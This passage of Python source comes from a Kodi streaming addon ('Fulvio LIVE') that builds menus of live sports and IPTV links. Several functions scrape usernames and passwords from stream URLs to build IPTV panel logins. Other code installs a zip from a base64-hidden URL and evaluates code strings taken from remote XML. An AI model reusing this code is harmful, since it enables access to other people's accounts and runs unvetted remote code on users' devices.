            addDir('  [COLOR hotpink]'+matches2[n]+'[/COLOR] ','',553,img,'','','','','','list')
            n += 1
            addDir('[COLOR lime]('+str(len(matches1))+')[/COLOR] [COLOR white]'+hh+mm+'[/COLOR] [COLOR yellow]'+sport+'[/COLOR] [COLOR cyan]'+event+'[/COLOR] [COLOR lime]('+compet+')[/COLOR]',str(url),553,img,'','','','','','list')
        else:
            addDir('[COLOR lime]('+str(len(matches1))+')[/COLOR] [COLOR white]'+hh+mm+'[/COLOR] [COLOR yellow]'+sport+'[/COLOR] [COLOR cyan]'+event+'[/COLOR] [COLOR lime]('+compet+')[/COLOR]',str(url),553,img,'','','','','','list')
        lasthh = int(hh)

def getArenavision2(url):
    matches = re.compile(r'<a>(.+?)<a><b>(.+?)<b><c>(.+?)<c>', re.DOTALL).findall(url)
    total = len(matches)
    c = 0
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    links = []
    names = []
    for link, name, lang in matches:
        c += 1
        links.append(link)
        name = '[COLOR yellow] '+str(c)+' [/COLOR] | [COLOR lime]'+str(name)+' '+str(lang)+'[/COLOR]'
        names.append(name)
    
    select = Getdialogselect('Seleziona il flusso - by FULVIO',names)
    xbmc.sleep(150)
    if select == -1:
        pass
    for i in range(len(matches)):
        if select == i:
            sp = 'plugin://program.plexus/?url='+urllib.quote_plus(links[i])+'&mode=1&name='+urllib.quote_plus(names[i])+'&iconimage='+urllib.quote_plus(thumbnail)
            xbmc.sleep(350)
            xbmc.executebuiltin('XBMC.RunPlugin('+sp+')')

def lisrek(data):
    i=[
    ['0','B'],\
    ['1','g'],\
    ['2','r'],\
    ['3','W'],\
    ['4','m'],\
    ['5','A'],\
    ['6','p'],\
    ['7','E'],\
    ['8','t'],\
    ['9','n'],\
    ]
    return i

def Loganlis():
    matches = set()
    out = set()
    c = makeRequest('https://raw.githubusercontent.com/logan1983/ADDONS-MENUS/master/ITALIA%20MENU.xml')
    match = re.findall(r'<externallink>(http[^<$]+).*?</externallink>', c)
    for it in match:
        matches.add(it)
    c = makeRequest('https://raw.githubusercontent.com/logan1983/ADDONS-MENUS/master/ESPANHA%20MENU.xml')
    match = re.findall(r'<externallink>(http[^<$]+).*?</externallink>', c)
    for it in match:
        matches.add(it)
    c = makeRequest('https://raw.githubusercontent.com/logan1983/ADDONS-MENUS/master/PORTUGAL%20MENU.xml')
    match = re.findall(r'<externallink>(http[^<$]+).*?</externallink>', c)
    for it in match:
        matches.add(it)
    c = makeRequest('https://raw.githubusercontent.com/logan1983/ADDONS-MENUS/master/LOGAN%20TV%20DESPORTO.xml')
    nat = re.findall(r'http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)', c)
    for i1,i2,i3 in nat:
        list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
        matches.add(list)
    for item in matches:
        if not item.find("get.php?username=")>0:
            try:
                c = makeRequest(item)
                ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",c)
                for i1,i2,i3 in ch:
                    list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                    out.add(list)
            except:
                pass
        else:
            out.add(item)
    return out

def Extlist(u=base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2JiSzBEbnVR')):
    matches = set()
    out = set()
    c = makeRequest(u)
    c = gethome(c,base64.decodestring('eXZvY2hkdDVCR1MwSmFzOQ=='))
    match = re.findall(r'(http[^\s]+)', c)
    for it in match:
        matches.add(it)

    for item in matches:
        if not item.find("get.php?username=")>0:
            try:
                c = makeRequest(item)
                ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",c)
                for i1,i2,i3 in ch:
                    list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                    out.add(list)
            except:
                pass
        else:
            out.add(item)
    return out

def getIptvsource(url):
    addDir('[B] [COLOR yellow]  IPTV Source by Fulvio[/COLOR][/B]',url,567,'','','','','','','list')

    # import ssl
    # import urllib2

    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    
    header = {\
    'Connection':'keep-alive',\
    'Cache-Control':'max-age=0',\
    'Upgrade-Insecure-Requests':'1',\
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',\
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\
    'Accept-Encoding':'gzip, deflate, sdch, br',\
    'Accept-Language':'it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4',\
    }
    # req = urllib2.Request(url, headers=header)

    # try:
        # page = urllib2.urlopen(req)
    # except urllib2.HTTPError, e:
        # print e.fp.read()

    # html = page.read()
    html = makeRequest(url, header)
    blogpage = re.compile(r'<h3 class="entry-title td-module-title"><a href="(http[^"]+)"[^>]+>([^<]+)<').findall(html)
    c = 0
    img = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'

    for url, name in blogpage:
        c += 1
        addDir('[B][COLOR white]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR][/B]',url,568,img,'','','','','','list')
    try:
        nextp = re.compile(r'<a href="(http[^"]+)"><i class="td-icon-menu-right"></i></a><span class="pages">Page (\d+) of').findall(html)
        for link, num in nextp:
            num = int(num)+1
            addDir('[B] [COLOR yellow]Next Page ('+str(num)+')[/COLOR][/B]',link,567,'','','','','','','list')
    except: pass

def getIptvsource2(url):
    matches = set()
    out = set()
    c = makeRequest(url)

    match = re.findall(r'<a href="(http[^"]+)">Download', c)
    for it in match:
        matches.add(it)

    match = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)", c)
    for i1,i2,i3 in match:
        list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
        out.add(list)

    for item in matches:
        if not item.find("get.php?username=")>0:
            # try:
            c = makeRequest(item)
            ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",c)
            for i1,i2,i3 in ch:
                list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                out.add(list)
            # except:
                # pass
        else:
            out.add(item)
    return out

def getUstreamix(u='http://v2.ustreamix.com/'):
    from operator import itemgetter
    addDir('[B] [COLOR yellow]  Ustreamix by Fulvio[/COLOR][/B]',url,574,'','','','','','','list')

    addDir(' ','',574,'','','','','','','list')
    addDir('[B] [COLOR yellow]ITALY[/COLOR] [/B]','',574,'','','','','','','list')
    h = makeRequest(u)
    m = re.findall(r'<p><a\s*href="([^"]+)"[^>]*>([\w\s\-!+\/\[\]\.\&]*(?:Italia|Italy|calcio|Rai)[\w\s\-!+\/\[\]\.\&]*)<span\s*class="status_live">(Live[^<]*)<\/span>[^<]*<\/a><\/p>',h)
    m = sorted(m, key=itemgetter(1))
    img = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    total = len(m)
    for i1,i2,i3 in m:
        c += 1
        addLink(u+i1, '[B] [COLOR white]'+str(c)+'[/COLOR] |  [COLOR skyblue]'+i2+'[/COLOR]  [COLOR lime]'+i3+'[/COLOR][/B]',img,'','','','',True,None,'',total)

    addDir(' ','',574,'','','','','','','list')
    addDir('[B] [COLOR yellow]OTHERS[/COLOR] [/B]','',574,'','','','','','','list')
    m = re.findall(r'<p><a\s*href="([^"]+)"[^>]*>([\w\s\-!+\/\[\]\.\&]*)<span\s*class="status_live">(Live[^<]*)<\/span>[^<]*<\/a><\/p>',h)
    m = sorted(m, key=itemgetter(1))
    img = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    total = len(m)
    for i1,i2,i3 in m:
        c += 1
        addLink(u+i1, '[B] [COLOR white]'+str(c)+'[/COLOR] |  [COLOR skyblue]'+i2+'[/COLOR]  [COLOR lime]'+i3+'[/COLOR][/B]',img,'','','','',True,None,'',total)

def getChannelItems(name,url,fanart):
        soup = getSoup(url)
        channel_list = soup.find('channel', attrs={'name' : name.decode('utf-8')})
        items = channel_list('item')
        try:
            fanArt = channel_list('fanart')[0].string
            if fanArt == None:
                raise
        except:
            fanArt = fanart
        for channel in channel_list('subchannel'):
            name = channel('name')[0].string
            if re.search(base64.decodestring('cGF5cGFs'), name):
                name = base64.decodestring('W0JdICBbQ09MT1Igd2hpdGVdVW5pc2NpdGkgYWwgY2FuYWxlIGRpIHN1cHBvcnRvWy9DT0xPUl0gW0NPTE9SIGxpbWVdVGVsZWdyYW1bL0NPTE9SXSAgW0NPTE9SIGJsdWVdQGZ1bHZpb2xpdmVbL0NPTE9SXVsvQl0=')

            try:
                thumbnail = channel('thumbnail')[0].string
                if thumbnail == None:
                    raise
                thumbnail=processPyFunction(thumbnail)
            except:
                thumbnail = ''
            try:
                if not channel('fanart'):
                    if addon.getSetting('use_thumb') == "true":
                        fanArt = thumbnail
                else:
                    fanArt = channel('fanart')[0].string
                if fanArt == None:
                    raise
            except:
                pass
            try:
                desc = channel('info')[0].string
                if desc == None:
                    raise
            except:
                desc = ''

            try:
                genre = channel('genre')[0].string
                if genre == None:
                    raise
            except:
                genre = ''

            try:
                date = channel('date')[0].string
                if date == None:
                    raise
            except:
                date = ''

            try:
                credits = channel('credits')[0].string
                if credits == None:
                    raise
            except:
                credits = ''

            try:
                addDir(name.encode('utf-8', 'ignore'),url.encode('utf-8'),3,thumbnail,fanArt,desc,genre,credits,date)
            except:
                addon_log('There was a problem adding directory - '+name.encode('utf-8', 'ignore'))
        getItems(items,fanArt)

def getSubChannelItems(name,url,fanart):
        soup = getSoup(url)
        channel_list = soup.find('subchannel', attrs={'name' : name.decode('utf-8')})
        items = channel_list('subitem')
        getItems(items,fanart)

def getItems(items,fanart,dontLink=False):
    total = len(items)
    addon_log('Total Items: %s' %total)
    add_playlist = addon.getSetting('add_playlist')
    ask_playlist_items =addon.getSetting('ask_playlist_items')
    use_thumb = addon.getSetting('use_thumb')
    parentalblock =addon.getSetting('parentalblocked')
    parentalblock= parentalblock=="true"
    for item in items:
        isXMLSource=False
        isJsonrpc = False
        scanM3u = False
        
        applyblock='false'
        try:
            applyblock = item('parentalblock')[0].string
        except:
            addon_log('parentalblock Error')
            applyblock = ''
        if applyblock=='true' and parentalblock: continue
            
        try:
            name = item('title')[0].string
            if re.search(base64.decodestring('cGF5cGFs'), name):
                name = base64.decodestring('W0JdICBbQ09MT1Igd2hpdGVdVW5pc2NpdGkgYWwgY2FuYWxlIGRpIHN1cHBvcnRvWy9DT0xPUl0gW0NPTE9SIGxpbWVdVGVsZWdyYW1bL0NPTE9SXSAgW0NPTE9SIGJsdWVdQGZ1bHZpb2xpdmVbL0NPTE9SXVsvQl0=')

            if name is None:
                name = 'unknown?'
        except:
            addon_log('Name Error')
            name = ''

        try:
            if item('epg'):
                if item.epg_url:
                    addon_log('Get EPG Regex')
                    epg_url = item.epg_url.string
                    epg_regex = item.epg_regex.string
                    epg_name = get_epg(epg_url, epg_regex)
                    if epg_name:
                        name += ' - ' + epg_name
                elif item('epg')[0].string > 1:
                    name += getepg(item('epg')[0].string)
            else:
                pass
        except:
            addon_log('EPG Error')
        try:
            url = []
            if len(item('link')) >0:
                #print 'item link', item('link')

                for i in item('link'):
                    if not i.string == None:
                        url.append(i.string)

            elif len(item('sportsdevil')) >0:
                for i in item('sportsdevil'):
                    if not i.string == None:
                        sportsdevil = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url=' +i.string
                        referer = item('referer')[0].string
                        if referer:
                            #print 'referer found'
                            sportsdevil = sportsdevil + '%26referer=' +referer
                        url.append(sportsdevil)
            elif len(item('p2p')) >0:
                for i in item('p2p'):
                    if not i.string == None:
                        if 'sop://' in i.string:
                            sop = 'plugin://plugin.video.p2p-streams/?mode=2url='+i.string +'&' + 'name='+name
                            url.append(sop)
                        else:
                            p2p='plugin://plugin.video.p2p-streams/?mode=1&url='+i.string +'&' + 'name='+name
                            url.append(p2p)
            elif len(item('vaughn')) >0:
                for i in item('vaughn'):
                    if not i.string == None:
                        vaughn = 'plugin://plugin.stream.vaughnlive.tv/?mode=PlayLiveStream&amp;channel='+i.string
                        url.append(vaughn)
            elif len(item('ilive')) >0:
                for i in item('ilive'):
                    if not i.string == None:
                        if not 'http' in i.string:
                            ilive = 'plugin://plugin.video.tbh.ilive/?url=http://www.streamlive.to/view/'+i.string+'&amp;link=99&amp;mode=iLivePlay'
                        else:
                            ilive = 'plugin://plugin.video.tbh.ilive/?url='+i.string+'&amp;link=99&amp;mode=iLivePlay'
            elif len(item('yt-dl')) >0:
                for i in item('yt-dl'):
                    if not i.string == None:
                        ytdl = i.string + '&mode=18'
                        url.append(ytdl)
            elif len(item('dm')) >0:
                for i in item('dm'):
                    if not i.string == None:
                        dm = "plugin://plugin.video.dailymotion_com/?mode=playVideo&url=" + i.string
                        url.append(dm)
            elif len(item('dmlive')) >0:
                for i in item('dmlive'):
                    if not i.string == None:
                        dm = "plugin://plugin.video.dailymotion_com/?mode=playLiveVideo&url=" + i.string
                        url.append(dm)
            elif len(item('utube')) >0:
                for i in item('utube'):
                    if not i.string == None:
                        if ' ' in i.string :
                            utube = 'plugin://plugin.video.youtube/search/?q='+ urllib.quote_plus(i.string)
                            isJsonrpc=utube
                        elif len(i.string) == 11:
                            utube = 'plugin://plugin.video.youtube/play/?video_id='+ i.string
                        elif (i.string.startswith('PL') and not '&order=' in i.string) or i.string.startswith('UU'):
                            utube = 'plugin://plugin.video.youtube/play/?&order=default&playlist_id=' + i.string
                        elif i.string.startswith('PL') or i.string.startswith('UU'):
                            utube = 'plugin://plugin.video.youtube/play/?playlist_id=' + i.string
                        elif i.string.startswith('UC') and len(i.string) > 12:
                            utube = 'plugin://plugin.video.youtube/channel/' + i.string + '/'
                            isJsonrpc=utube
                        elif not i.string.startswith('UC') and not (i.string.startswith('PL'))  :
                            utube = 'plugin://plugin.video.youtube/user/' + i.string + '/'
                            isJsonrpc=utube
                    url.append(utube)
            elif len(item('imdb')) >0:
                for i in item('imdb'):
                    if not i.string == None:
                        if addon.getSetting('genesisorpulsar') == '0':
                            imdb = 'plugin://plugin.video.genesis/?action=play&imdb='+i.string
                        else:
                            imdb = 'plugin://plugin.video.pulsar/movie/tt'+i.string+'/play'
                        url.append(imdb)
            elif len(item('f4m')) >0:
                    for i in item('f4m'):
                        if not i.string == None:
                            if '.f4m' in i.string:
                                f4m = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(i.string)
                            elif '.m3u8' in i.string:
                                f4m = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(i.string)+'&amp;streamtype=HLS'

                            else:
                                f4m = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(i.string)+'&amp;streamtype=SIMPLE'
                        url.append(f4m)
            elif len(item('ftv')) >0:
                for i in item('ftv'):
                    if not i.string == None:
                        ftv = 'plugin://plugin.video.F.T.V/?name='+urllib.quote(name) +'&url=' +i.string +'&mode=125&ch_fanart=na'
                    url.append(ftv)
            elif len(item('urlsolve')) >0:
                
                for i in item('urlsolve'):
                    if not i.string == None:
                        resolver = i.string +'&mode=19'
                        url.append(resolver)
            if len(url) < 1:
                raise
        except:
            addon_log('Error <link> element, Passing:'+name.encode('utf-8', 'ignore'))
            continue
        try:
            isXMLSource = item('externallink')[0].string
        except: pass

        if isXMLSource:
            ext_url=[isXMLSource]
            isXMLSource=True
        else:
            isXMLSource=False
        try:
            isJsonrpc = item('jsonrpc')[0].string
        except: pass
        if isJsonrpc:

            ext_url=[isJsonrpc]
            #print 'JSON-RPC ext_url',ext_url
            isJsonrpc=True
        else:
            isJsonrpc=False

        try:
            scanM3u = item('scan')[0].string
        except: 
            pass

        if scanM3u:
            ext_url=[scanM3u]
            scanM3u=True
        else:
            scanM3u=False

        try:
            thumbnail = item('thumbnail')[0].string
            if thumbnail == None:
                raise
            thumbnail=processPyFunction(thumbnail)
        except:
            thumbnail = ''
        try:
            if not item('fanart'):
                if addon.getSetting('use_thumb') == "true":
                    fanArt = thumbnail
                else:
                    fanArt = fanart
            else:
                fanArt = item('fanart')[0].string
            if fanArt == None:
                raise
        except:
            fanArt = fanart
        try:
            desc = item('info')[0].string
            if desc == None:
                raise
        except:
            desc = ''

        try:
            genre = item('genre')[0].string
            if genre == None:
                raise
        except:
            genre = ''

        try:
            date = item('date')[0].string
            if date == None:
                raise
        except:
            date = ''

        regexs = None
        if item('regex'):
            try:
                reg_item = item('regex')
                regexs = parse_regex(reg_item)
            except:
                pass
        try:
            
            if len(url) > 1:
                alt = 0
                playlist = []
                ignorelistsetting=True if '$$LSPlayOnlyOne$$' in url[0] else False
                
                for i in url:
                        if  add_playlist == "false" and not ignorelistsetting:
                            alt += 1
                            addLink(i,'%s) %s' %(alt, name.encode('utf-8', 'ignore')),thumbnail,fanArt,desc,genre,date,True,playlist,regexs,total)
                        elif  (add_playlist == "true" and  ask_playlist_items == 'true') or ignorelistsetting:
                            if regexs:
                                playlist.append(i+'&regexs='+regexs)
                            elif  any(x in i for x in resolve_url) and  i.startswith('http'):
                                playlist.append(i+'&mode=19')
                            else:
                                playlist.append(i)
                        else:
                            playlist.append(i)
                
                if len(playlist) > 1:
                    
                    addLink('', name.encode('utf-8'),thumbnail,fanArt,desc,genre,date,True,playlist,regexs,total)
            else:
                
                if dontLink:
                    return name,url[0],regexs
                if isXMLSource:
                        if not regexs == None: #<externallink> and <regex>
                            addDir(name.encode('utf-8'),ext_url[0].replace(';','').encode('utf-8'),1,thumbnail,fanArt,desc,genre,date,None,'!!update',regexs,url[0].encode('utf-8'))
                            #addLink(url[0],name.encode('utf-8', 'ignore')+  '[COLOR yellow]build XML[/COLOR]',thumbnail,fanArt,desc,genre,date,True,None,regexs,total)
                        else:
                            addDir(name.encode('utf-8'),ext_url[0].replace(';','').encode('utf-8'),1,thumbnail,fanArt,desc,genre,date,None,True,None,None)
                            #addDir(name.encode('utf-8'),url[0].encode('utf-8'),1,thumbnail,fanart,desc,genre,date,None,'source')
                elif isJsonrpc:
                    addDir(name.encode('utf-8'),ext_url[0],53,thumbnail,fanArt,desc,genre,date,None,True)
                    #xbmc.executebuiltin("Container.SetViewMode(500)")
                elif scanM3u:
                    addDir(name.encode('utf-8'),ext_url[0],554,thumbnail,fanArt,desc,genre,date,None,True)
                else:
                    try:
                        if '$doregex' in name and not getRegexParsed==None:
                            tname,setres=getRegexParsed(regexs, name)
                            if not tname==None:
                                name=tname
                    except: 
                        pass
                    try:
                        if '$doregex' in thumbnail and not getRegexParsed==None:
                            tname,setres=getRegexParsed(regexs, thumbnail)
                            if not tname==None:
                                thumbnail=tname
                    except: 
                        pass

                    addLink(url[0],name.encode('utf-8', 'ignore'),thumbnail,fanArt,desc,genre,date,True,None,regexs,total)
                #print 'success'
        except:
            addon_log('There was a problem adding item - '+name.encode('utf-8', 'ignore'))

def processPyFunction(data):
    try:
        if data and len(data)>0 and data.startswith('$pyFunction:'):
            data=doEval(data.split('$pyFunction:')[1],'',None,None )
    except: pass

    return data

def getAddonlist():
        try:
            addDir('[B][COLOR yellow]ADDON necessari [/COLOR][/B]','url',517,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]F4mProxy [/COLOR][/B]','f4mproxy',519,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]f4mTester [/COLOR][/B]','f4mtester',520,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]SportsDevil [/COLOR][/B]','f4mtester',521,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]SOD Stream On Demand [/COLOR][/B]','streamondemand',530,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]Exodus [/COLOR][/B]','exodus',531,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]Plexus [/COLOR][/B]','plexus',537,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]Opensubtitles [/COLOR][/B]','opensubtitles',538,os.path.join(home, 'icon.png'),FANART,'','','','','list')
            addDir('[B][COLOR white]EZ Maintenance [/COLOR][/B]','ezmaintenance ',602,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        except: traceback.print_exc()

def getF4mproxy():
    home = 'https://offshoregit.com/Shani-08/main/zips/script.video.F4mProxy/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(script[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getF4mtester():
    home = 'https://offshoregit.com/Shani-08/main/zips/plugin.video.f4mTester/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(plugin[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getSportsdevil():
    home = 'https://offshoregit.com/unofficialsportsdevil/plugin.video.SportsDevil/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(plugin[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getStreamondemand():
    home = 'https://github.com/streamondemand/plugin.video.streamondemand/releases'
    data = makeRequest(home)
    files = re.findall(r'<a href="\/streamondemand\/plugin.video.streamondemand\/releases\/tag\/([^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for name in files:
        c += 1
        zip = 'https://github.com/streamondemand/plugin.video.streamondemand/releases/download/'+name+'/'+name+'.zip'
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+name+'[/COLOR][/B]',zip,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getExodus():
    home = 'https://offshoregit.com/exodus/plugin.video.exodus/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(plugin[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getPlexus():
    home = 'https://offshoregit.com/xbmchub/xbmc-hub-repo/raw/master/program.plexus/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(program[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')
    addDir('  [COLOR white]Fix configuration for Windows with 0.1.4 version[/COLOR] ','url',551,os.path.join(home, 'icon.png'),FANART,'','','','','list')

    addDir('','url',537,os.path.join(home, 'icon.png'),FANART,'','','','','list')

    home = 'http://repo.adryanlist.org/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(program.plexus[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getOpensub():
    home = 'https://offshoregit.com/xbmchub/xbmc-hub-repo/raw/master/service.subtitles.opensubtitles_by_opensubtitles/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(service[^"]+)"', data)
    files = sorted(files, reverse=True)
    c = 0
    for file in files:
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+' [/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getPlexusfix():
    url = base64.decodestring('aHR0cHM6Ly9naXRodWIuY29tL3JhbXMzcmxlci9wREhPMHloUHFpejVSVDZpTm9mYy9yYXcvbWFzdGVyL3Byb2dyYW0ucGxleHVzLnppcA==')
    addonname = url.split('/')[-1].split('.zip')[0].lower()
    xbmc.log('addoname: '+addonname)
    extpath = xbmc.translatePath(os.path.join('special://userdata','addon_data'))
    addonsDir = xbmc.translatePath(os.path.join('special://home', 'userdata'))
    packageFile = os.path.join(addonsDir, 'package.zip')
    UPDATE_URL = url
    xbmc.log('START DOWNLOAD UPDATE:' + UPDATE_URL)
    DownloaderClass(UPDATE_URL,packageFile)  
    import ziptools
    unzipper = ziptools.ziptools()
    unzipper.extract(packageFile,extpath)
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmcgui.Dialog().ok('Fulvio LIVE', 'Installazione completata.', '')
    if os.remove( packageFile ): 
        xbmc.log('TEMPORARY ZIP REMOVED')

def getEZMaintenance():
    home = 'https://ftp.acc.umu.se/mirror/addons.superrepo.org/v7/addons/script.ezmaintenance/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(script[^"]+zip)">[^<]+</a>(.+)', data)
    files = sorted(files, reverse=True)
    c = 0
    for file, date in files:
        date=date.replace('  ','')
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+'[/COLOR] [COLOR white]'+date+'[/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def getserviceIptvsimple():
    home = 'https://ftp.acc.umu.se/mirror/addons.superrepo.org/v7/addons/service.iptvsimple.plugin.player/'
    data = makeRequest(home)
    files = re.findall(r'<a href="(service[^"]+zip)">[^<]+</a>(.+)', data)
    files = sorted(files, reverse=True)
    c = 0
    for file, date in files:
        date=date.replace('  ','')
        c += 1
        addDir('[B][COLOR yellow]'+str(c)+'[/COLOR] | [COLOR cyan]'+file+'[/COLOR] [COLOR white]'+date+'[/COLOR][/B]',home+file,518,os.path.join(home, 'icon.png'),FANART,'','','','','list')

def parse_regex(reg_item):
                try:
                    regexs = {}
                    for i in reg_item:
                        regexs[i('name')[0].string] = {}
                        regexs[i('name')[0].string]['name']=i('name')[0].string
                        #regexs[i('name')[0].string]['expres'] = i('expres')[0].string
                        try:
                            regexs[i('name')[0].string]['expres'] = i('expres')[0].string
                            if not regexs[i('name')[0].string]['expres']:
                                regexs[i('name')[0].string]['expres']=''
                        except:
                            addon_log("Regex: -- No Referer --")
                        regexs[i('name')[0].string]['page'] = i('page')[0].string
                        try:
                            regexs[i('name')[0].string]['referer'] = i('referer')[0].string
                        except:
                            addon_log("Regex: -- No Referer --")
                        try:
                            regexs[i('name')[0].string]['connection'] = i('connection')[0].string
                        except:
                            addon_log("Regex: -- No connection --")

                        try:
                            regexs[i('name')[0].string]['notplayable'] = i('notplayable')[0].string
                        except:
                            addon_log("Regex: -- No notplayable --")

                        try:
                            regexs[i('name')[0].string]['noredirect'] = i('noredirect')[0].string
                        except:
                            addon_log("Regex: -- No noredirect --")
                        try:
                            regexs[i('name')[0].string]['origin'] = i('origin')[0].string
                        except:
                            addon_log("Regex: -- No origin --")
                        try:
                            regexs[i('name')[0].string]['accept'] = i('accept')[0].string
                        except:
                            addon_log("Regex: -- No accept --")
                        try:
                            regexs[i('name')[0].string]['includeheaders'] = i('includeheaders')[0].string
                        except:
                            addon_log("Regex: -- No includeheaders --")

                            
                        try:
                            regexs[i('name')[0].string]['listrepeat'] = i('listrepeat')[0].string
#                            print 'listrepeat',regexs[i('name')[0].string]['listrepeat'],i('listrepeat')[0].string, i
                        except:
                            addon_log("Regex: -- No listrepeat --")
                    
                            

                        try:
                            regexs[i('name')[0].string]['proxy'] = i('proxy')[0].string
                        except:
                            addon_log("Regex: -- No proxy --")
                            
                        try:
                            regexs[i('name')[0].string]['x-req'] = i('x-req')[0].string
                        except:
                            addon_log("Regex: -- No x-req --")

                        try:
                            regexs[i('name')[0].string]['x-addr'] = i('x-addr')[0].string
                        except:
                            addon_log("Regex: -- No x-addr --")                            
                            
                        try:
                            regexs[i('name')[0].string]['x-forward'] = i('x-forward')[0].string
                        except:
                            addon_log("Regex: -- No x-forward --")

                        try:
                            regexs[i('name')[0].string]['agent'] = i('agent')[0].string
                        except:
                            addon_log("Regex: -- No User Agent --")
                        try:
                            regexs[i('name')[0].string]['post'] = i('post')[0].string
                        except:
                            addon_log("Regex: -- Not a post")
                        try:
                            regexs[i('name')[0].string]['rawpost'] = i('rawpost')[0].string
                        except:
                            addon_log("Regex: -- Not a rawpost")
                        try:
                            regexs[i('name')[0].string]['htmlunescape'] = i('htmlunescape')[0].string
                        except:
                            addon_log("Regex: -- Not a htmlunescape")


                        try:
                            regexs[i('name')[0].string]['readcookieonly'] = i('readcookieonly')[0].string
                        except:
                            addon_log("Regex: -- Not a readCookieOnly")
                        #print i
                        try:
                            regexs[i('name')[0].string]['cookiejar'] = i('cookiejar')[0].string
                            if not regexs[i('name')[0].string]['cookiejar']:
                                regexs[i('name')[0].string]['cookiejar']=''
                        except:
                            addon_log("Regex: -- Not a cookieJar")
                        try:
                            regexs[i('name')[0].string]['setcookie'] = i('setcookie')[0].string
                        except:
                            addon_log("Regex: -- Not a setcookie")
                        try:
                            regexs[i('name')[0].string]['appendcookie'] = i('appendcookie')[0].string
                        except:
